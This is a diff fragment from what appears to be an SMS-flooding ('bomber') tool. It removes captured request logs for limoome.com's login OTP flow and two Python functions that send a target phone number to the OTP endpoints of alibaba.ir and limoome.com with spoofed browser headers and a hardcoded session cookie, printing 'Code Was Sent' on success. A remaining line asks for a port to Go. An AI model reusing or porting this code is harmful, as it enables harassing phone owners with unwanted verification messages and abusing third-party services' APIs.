@@ -328,105 +328,7 @@ Status Code
 
 { 'MobileNo': '09122221515'}
 ---------------------------------------------------------------
-1:
-Request URL
-https://my.limoome.com/auth/check-mobile
-Request Method
-POST
-Status Code
-200 OK
-
-{mobileNumber: "9122221515", countryId: "1"}
-countryId
-: 
-"1"
-mobileNumber
-: 
-"9122221515"
-
-2:
-Request URL
-https://my.limoome.com/lemonade/api/analytics
-Request Method
-POST
-Status Code
-201 Created
-
-{action: "get_otp", category: "click",…}
-action
-: 
-"get_otp"
-category
-: 
-"click"
-label
-: 
-"https://my.limoome.com/enter/#/?utm_source=limoome&utm_medium=site&utm_campaign=hmpglogin"
-meta
-: 
-{source: "front"}
-service
-: 
-"LIMOOME_SHOP"
-sessionId
-: 
-"cmdigluny86063dvraeusujn2p"
-
-3:
-Request URL
-https://my.limoome.com/lemonade/api/analytics
-Request Method
-POST
-Status Code
-201 Created
-
-{action: "check_mobile", category: "responded",…}
-action
-: 
-"check_mobile"
-category
-: 
-"responded"
-label
-: 
-"https://my.limoome.com/enter/#/?utm_source=limoome&utm_medium=site&utm_campaign=hmpglogin"
-meta
-: 
-{source: "front"}
-service
-: 
-"LIMOOME_SHOP"
-sessionId
-: 
-"cmdigluny86063dvraeusujn2p"
-
-4:
-Request URL
-https://my.limoome.com/api/auth/login/otp
-Request Method
-POST
-Status Code
-200 Ok
-
-
-mobileNumber
-9122221515
-country
-1
----------------------------------------------------------------
 python code change to golang:
-
-def alibaba(phone):
-    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
-    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
-    try:
-        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
-        if alibabaR["result"]["success"] == True:
-            print(f'{g}(AliBaba) {w}Code Was Sent')
-            return True
-    except:
-        pass
----------------------------------------------------------------
 
 def okorosh(phone):
     okJ = {
@@ -452,28 +354,7 @@ def okorosh(phone):
     except:
         pass
 ---------------------------------------------------------------
-def limome(phone):
-    liD = {'mobileNumber': phone.split('+98')[1],
-'country': '1'}
-    liU = 'https://my.limoome.com/api/auth/login/otp'
-    liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
-'Accept-Encoding': 'gzip, deflate, br',
-'Accept-Language': 'en-US,en;q=0.9',
-'Connection': 'keep-alive',
-'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1',
-'Host': 'my.limoome.com',
-'Origin': 'https://my.limoome.com',
-'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment',
-'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
-'X-Requested-With': 'XMLHttpRequest'}
-    try:
-        liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
-        if liR['status'] == 'success':
-            print(f'{g}(Limome) {w}Code Was Sent')
-            return True
-    except:
-        pass
+
 
 
 
